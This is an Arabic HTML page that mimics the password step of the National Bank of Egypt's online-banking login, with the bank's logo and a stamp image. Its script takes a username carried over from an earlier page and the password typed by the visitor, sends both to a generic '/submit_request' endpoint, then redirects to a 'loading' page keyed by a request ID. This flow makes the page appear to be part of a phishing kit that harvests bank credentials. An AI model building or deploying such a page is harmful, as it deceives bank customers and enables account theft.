<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك الأهلي المصري - كلمة المرور</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="login-theme.css">
</head>
<body>

<header class="site-header">
    <div class="header-left">
        <div class="menu-btn"><i class="fas fa-bars"></i></div>
        <a href="password_en.html" class="lang-switcher">
            <span>English</span>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
        </a>
    </div>
    <div class="header-right">
        <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <div class="card-logo">
            <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
        </div>

        <a href="login.html" class="back-link">
            <span>العودة إلى كود المستخدم</span>
            <i class="fas fa-arrow-right"></i>
        </a>

        <div class="welcome-msg">أهلاً بك يا <span id="displayUsername">...</span></div>
        <h1 class="page-heading">كلمة المرور</h1>

        <div class="stamp-img">
            <img src="stamp.jpg" alt="Stamp">
        </div>

        <section class="login-card">
            <div id="errorMessage" role="alert"></div>
            <form id="step2Form">
                <div class="form-group">
                    <label class="form-label">كلمة المرور</label>
                    <div class="form-control-wrapper">
                        <input type="password" id="password" name="password" class="form-control" placeholder="أدخل كلمة المرور الخاصة بك" required autofocus>
                        <i class="far fa-eye pass-toggle" id="togglePass"></i>
                    </div>
                </div>
                <a href="#" class="forgot-link">نسيت كلمة المرور؟</a>
                
                <button type="submit" class="submit-btn">تسجيل الدخول</button>
            </form>
        </section>
    </div>
</main>

<script>
// عرض اسم المستخدم من الصفحة السابقة
const savedUsername = localStorage.getItem('temp_username') || 'عميلنا العزيز';
document.getElementById('displayUsername').textContent = savedUsername;

// تبديل رؤية كلمة المرور
document.getElementById('togglePass').addEventListener('click', function() {
    const passInput = document.getElementById('password');
    if (passInput.type === 'password') {
        passInput.type = 'text';
        this.classList.replace('fa-eye', 'fa-eye-slash');
    } else {
        passInput.type = 'password';
        this.classList.replace('fa-eye-slash', 'fa-eye');
    }
});

document.getElementById('step2Form').addEventListener('submit', async function(event) {
    event.preventDefault();
    const password = document.getElementById('password').value;
    const username = localStorage.getItem('temp_username');
    const errorMessageDiv = document.getElementById('errorMessage');

    try {
        const response = await fetch('/submit_request', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'login',
                data: { username: username, password: password }
            })
        });

        const result = await response.json();
        if (result.status === 'approved' || result.status === 'pending') {
            window.location.href = 'loading.html?request_id=' + result.request_id;
        } else {
            errorMessageDiv.textContent = result.message || 'خطأ في تسجيل الدخول';
            errorMessageDiv.style.display = 'block';
        }
    } catch (error) {
        errorMessageDiv.textContent = 'حدث خطأ أثناء الاتصال بالخادم';
        errorMessageDiv.style.display = 'block';
    }
});
</script>
</body>
</html>
